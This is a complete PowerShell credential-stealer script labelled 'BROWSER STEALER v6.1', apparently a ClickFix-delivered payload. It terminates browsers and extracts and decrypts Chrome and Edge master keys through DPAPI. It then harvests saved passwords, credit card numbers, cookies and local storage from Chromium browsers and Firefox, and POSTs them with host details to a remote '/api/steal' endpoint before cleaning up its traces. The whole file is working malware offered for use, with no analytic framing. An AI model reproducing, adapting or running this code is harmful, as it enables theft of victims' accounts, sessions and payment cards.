# ============================================================
# BROWSER STEALER v6.1 — SINGLE ENV + CHROME MASTER KEY
# ============================================================

# {{BASE_URL}} is replaced by server.js dynamically
# DO NOT EDIT THIS LINE — set BASE_URL in Railway environment variables
$BASE_URL = "{{BASE_URL}}"
$SERVER_URL = "$BASE_URL/api/steal"
$DLL_DIR = "$env:TEMP\stealer_dlls"
$LOGFILE = "$env:TEMP\stealer_log.txt"

$SQLITE_DLL_URL = "$BASE_URL/System.Data.SQLite.dll"

Remove-Item $LOGFILE -Force -ErrorAction SilentlyContinue
Remove-Item $DLL_DIR -Recurse -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Path $DLL_DIR -Force -ErrorAction SilentlyContinue | Out-Null

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    Add-Content -Path $LOGFILE -Value $line
    Write-Host $line
}

Write-Log "============================================"
Write-Log "BROWSER STEALER v6.1"
Write-Log "Target: $env:COMPUTERNAME"
Write-Log "============================================"

function Download-Dll {
    param($Url, $Path, $Name)
    Write-Log "Downloading $Name..."
    try {
        $response = Invoke-WebRequest -Uri $Url -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing -TimeoutSec 15
        [System.IO.File]::WriteAllBytes($Path, $response.Content)
        Write-Log "$Name downloaded"
        return $true
    } catch {
        Write-Log "$Name failed"
        return $false
    }
}

$sqlitePath = "$DLL_DIR\System.Data.SQLite.dll"
$sqliteOk = Download-Dll -Url $SQLITE_DLL_URL -Path $sqlitePath -Name "SQLite"

if (-not $sqliteOk) {
    Write-Log "SQLite failed - aborting"
    exit
}

try {
    [System.Reflection.Assembly]::LoadFrom($sqlitePath) | Out-Null
    Write-Log "SQLite loaded"
} catch {
    Write-Log "SQLite load failed - aborting"
    exit
}

# ============================================================
# CLOSE ALL BROWSERS — UNLOCK SQLITE DATABASES
# ============================================================

function Close-Browsers {
    Write-Log "Closing browsers to unlock databases..."
    
    $browsers = @(
        "chrome", "msedge", "brave", "firefox", 
        "opera", "operagx", "vivaldi", "arc"
    )
    
    $closed = 0
    foreach ($b in $browsers) {
        $procs = Get-Process -Name $b -ErrorAction SilentlyContinue
        if ($procs) {
            foreach ($p in $procs) {
                try {
                    $p.CloseMainWindow() | Out-Null
                    Start-Sleep -Milliseconds 300
                    if (-not $p.HasExited) {
                        $p.Kill() | Out-Null
                    }
                    $closed++
                } catch {}
            }
        }
    }
    
    Start-Sleep -Seconds 3
    Write-Log "Closed $closed browser processes"
}

Close-Browsers

# ============================================================
# SQLITE READER
# ============================================================

function Read-SQLite {
    param($DbPath, $Query)
    $result = @()
    if (-not (Test-Path $DbPath)) { return $result }
    
    try {
        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $temp -Force -ErrorAction SilentlyContinue
        if (-not (Test-Path $temp)) { return $result }
        
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;Read Only=True;")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = $Query
        $cmd.CommandTimeout = 5
        $rdr = $cmd.ExecuteReader()
        while ($rdr.Read()) {
            $row = @{}
            for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                $n = $rdr.GetName($i)
                $v = $rdr.GetValue($i)
                if ($v -ne $null) { $row[$n] = $v }
            }
            $result += $row
        }
        $rdr.Close()
        $conn.Close()
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch {}
    return $result
}

# ============================================================
# CHROME MASTER KEY EXTRACTION & DECRYPTION
# ============================================================

function Get-ChromeMasterKey {
    param($BrowserPath)
    
    $localState = "$BrowserPath\Local State"
    if (-not (Test-Path $localState)) { 
        return $null 
    }
    
    try {
        $json = Get-Content $localState -Raw | ConvertFrom-Json
        $encryptedKey = $json.os_crypt.encrypted_key
        
        if (-not $encryptedKey) {
            return $null
        }
        
        $keyBytes = [System.Convert]::FromBase64String($encryptedKey)
        
        if ($keyBytes.Length -gt 5) {
            $keyBytes = $keyBytes[5..($keyBytes.Length-1)]
        } else {
            return $null
        }
        
        try {
            Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
            $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect($keyBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            return $decryptedKey
        } catch {
            return $null
        }
    } catch {
        return $null
    }
}

function Decrypt-ChromePassword {
    param($EncryptedData, $MasterKey)
    
    if (-not $EncryptedData) { return $null }
    if ($EncryptedData -isnot [byte[]]) { return $null }
    if ($EncryptedData.Length -eq 0) { return $null }
    
    try {
        $version = $EncryptedData[0]
        
        if ($version -eq 1) {
            if ($EncryptedData.Length -lt 29) { return $null }
            
            $nonce = $EncryptedData[1..12]
            $tagStart = $EncryptedData.Length - 16
            $tag = $EncryptedData[$tagStart..($EncryptedData.Length-1)]
            $ciphertext = $EncryptedData[13..($tagStart-1)]
            
            try {
                $aes = [System.Security.Cryptography.AesGcm]::new($MasterKey)
                $decrypted = [byte[]]::new($ciphertext.Length)
                $aes.Decrypt($nonce, $ciphertext, $tag, $decrypted)
                return [System.Text.Encoding]::UTF8.GetString($decrypted)
            } catch {}
        }
    } catch {}
    
    try {
        Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($EncryptedData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
    } catch {
        try {
            return [System.Text.Encoding]::UTF8.GetString($EncryptedData)
        } catch {
            return $null
        }
    }
}

# ============================================================
# BROWSER PROFILES
# ============================================================

function Get-Profiles {
    $profiles = @()
    
    $browserPaths = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data"
        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
        "Opera" = "$env:LOCALAPPDATA\Opera Software\Opera Stable"
        "OperaGX" = "$env:LOCALAPPDATA\Opera Software\Opera GX Stable"
        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data"
        "Arc" = "$env:LOCALAPPDATA\Arc\User Data"
    }
    
    foreach ($browser in $browserPaths.Keys) {
        $dir = $browserPaths[$browser]
        if (Test-Path $dir) {
            $subs = Get-ChildItem $dir -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "^Default$|^Profile " }
            foreach ($s in $subs) {
                $profiles += @{ path = $s.FullName; browser = $browser; basePath = $dir }
            }
        }
    }
    
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        $subs = Get-ChildItem $firefoxPath -Directory -ErrorAction SilentlyContinue
        foreach ($s in $subs) {
            $profiles += @{ path = $s.FullName; browser = "Firefox"; basePath = $firefoxPath }
        }
    }
    
    return $profiles
}

# ============================================================
# EXTRACT DATA
# ============================================================

function Get-BrowserData {
    $cookies = @{}
    $passwords = @()
    $cards = @()
    $localStorage = @{}
    
    $profiles = Get-Profiles
    $masterKeyCache = @{}
    
    foreach ($p in $profiles) {
        $path = $p.path
        $browser = $p.browser
        $basePath = $p.basePath
        
        # ---- FIREFOX ----
        if ($browser -eq "Firefox") {
            $cookieDb = "$path\cookies.sqlite"
            if (Test-Path $cookieDb) {
                $rows = Read-SQLite -DbPath $cookieDb -Query "SELECT host, name, value FROM moz_cookies"
                foreach ($r in $rows) {
                    if ($r['name'] -and $r['value']) {
                        $d = $r['host']
                        if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
                        $key = "$d|Firefox"
                        if (-not $cookies.ContainsKey($key)) { $cookies[$key] = @{} }
                        $cookies[$key][$r['name']] = $r['value']
                    }
                }
            }
            
            $loginJson = "$path\logins.json"
            if (Test-Path $loginJson) {
                try {
                    $json = Get-Content $loginJson -Raw | ConvertFrom-Json
                    if ($json.logins) {
                        foreach ($l in $json.logins) {
                            if ($l.username -and $l.password -and $l.username -ne "" -and $l.password -ne "") {
                                $u = $l.hostname -replace 'https?://', ''
                                $passwords += @{ 
                                    name = $l.username
                                    value = $l.password
                                    type = "password"
                                    url = $u
                                    browser = "Firefox"
                                }
                            }
                        }
                    }
                } catch {}
            }
            
            $storageDb = "$path\webappsstore.sqlite"
            if (Test-Path $storageDb) {
                try {
                    $rows = Read-SQLite -DbPath $storageDb -Query "SELECT scope, key, value FROM webappsstore2"
                    foreach ($r in $rows) {
                        if ($r['key'] -and $r['value']) {
                            $localStorage["Firefox:$($r['key'])"] = $r['value']
                        }
                    }
                } catch {}
            }
            
            continue
        }
        
        # ---- CHROMIUM ----
        if (-not $masterKeyCache.ContainsKey($browser)) {
            $masterKeyCache[$browser] = Get-ChromeMasterKey -BrowserPath $basePath
        }
        $masterKey = $masterKeyCache[$browser]
        
        $cookieDb = "$path\Network\Cookies"
        if (-not (Test-Path $cookieDb)) { $cookieDb = "$path\Cookies" }
        if (Test-Path $cookieDb) {
            $rows = Read-SQLite -DbPath $cookieDb -Query "SELECT host_key, name, value FROM cookies"
            foreach ($r in $rows) {
                if ($r['name'] -and $r['value']) {
                    $d = $r['host_key']
                    if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
                    $key = "$d|$browser"
                    if (-not $cookies.ContainsKey($key)) { $cookies[$key] = @{} }
                    $cookies[$key][$r['name']] = $r['value']
                }
            }
        }
        
        $loginDb = "$path\Login Data"
        if (Test-Path $loginDb) {
            $rows = Read-SQLite -DbPath $loginDb -Query "SELECT origin_url, username_value, password_value FROM logins"
            foreach ($r in $rows) {
                $username = $r['username_value']
                $encrypted = $r['password_value']
                $decrypted = $null
                
                if ($masterKey) {
                    $decrypted = Decrypt-ChromePassword -EncryptedData $encrypted -MasterKey $masterKey
                }
                
                if (-not $decrypted) {
                    try {
                        Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue
                        $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                        $decrypted = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                    } catch {}
                }
                
                if (-not $decrypted -and $encrypted) {
                    try { $decrypted = [System.Text.Encoding]::UTF8.GetString($encrypted) } catch {}
                }
                
                if ($username -and $decrypted -and $username -ne "" -and $decrypted -ne "") {
                    $u = $r['origin_url']
                    if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                    $passwords += @{ 
                        name = $username
                        value = $decrypted
                        type = "password"
                        url = $u
                        browser = $browser
                    }
                }
            }
        }
        
        $webData = "$path\Web Data"
        if (Test-Path $webData) {
            $rows = Read-SQLite -DbPath $webData -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
            foreach ($r in $rows) {
                if ($r['name_on_card'] -and $r['card_number_encrypted']) {
                    $cardNumber = $r['card_number_encrypted']
                    $decryptedCard = $null
                    
                    if ($masterKey) {
                        $decryptedCard = Decrypt-ChromePassword -EncryptedData $cardNumber -MasterKey $masterKey
                    }
                    
                    if (-not $decryptedCard) {
                        try {
                            $decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($cardNumber, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
                            $decryptedCard = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
                        } catch {}
                    }
                    
                    $cards += @{
                        name = $r['name_on_card']
                        value = $decryptedCard
                        type = "card-number"
                        url = $browser
                        browser = $browser
                        month = $r['expiration_month']
                        year = $r['expiration_year']
                    }
                }
            }
        }
    }
    
    return @{
        cookies = $cookies
        passwords = $passwords
        cards = $cards
        localStorage = $localStorage
    }
}

# ============================================================
# MAIN EXECUTION
# ============================================================

Write-Log "Scanning browser profiles..."
$data = Get-BrowserData

$cookieCount = $data.cookies.Count
$passCount = $data.passwords.Count
$cardCount = $data.cards.Count
$storageCount = $data.localStorage.Count

Write-Log ""
Write-Log "============================================"
Write-Log "SUMMARY"
Write-Log "============================================"
Write-Log "Cookies: $cookieCount"
Write-Log "Passwords: $passCount"
Write-Log "Cards: $cardCount"
Write-Log "LocalStorage (Firefox only): $storageCount"
Write-Log "============================================"

$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME
$osInfo = (Get-WmiObject Win32_OperatingSystem).Caption

$payload = @{
    cookies = $data.cookies
    credentials = $data.passwords
    cards = $data.cards
    localStorage = $data.localStorage
    system = @{
        hostname = $pcName
        username = $userName
        os = $osInfo
    }
    fingerprint = @{
        hostname = $pcName
        userAgent = "PowerShell Payload"
        browser = "PowerShell"
        screen = "N/A"
    }
    domain = $pcName
    browser = "PowerShell"
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $pcName
    nonce = [System.Guid]::NewGuid().ToString()
}

Write-Log "Sending data..."
try {
    $json = $payload | ConvertTo-Json -Depth 10
    Write-Log "Payload size: $($json.Length) bytes"
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $req = [System.Net.WebRequest]::Create($SERVER_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $req.Timeout = 15000
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Log "Data sent"
} catch {
    Write-Log "Send failed: $_"
}

Write-Log "Reopening browsers..."
try {
    Start-Process "chrome.exe" -ErrorAction SilentlyContinue
    Start-Process "msedge.exe" -ErrorAction SilentlyContinue
    Start-Process "firefox.exe" -ErrorAction SilentlyContinue
    Start-Process "brave.exe" -ErrorAction SilentlyContinue
} catch {}

Remove-Item $DLL_DIR -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\*.tmp" -Force -ErrorAction SilentlyContinue

Write-Log ""
Write-Log "Done!"
Write-Log "Log saved to: $LOGFILE"

exit
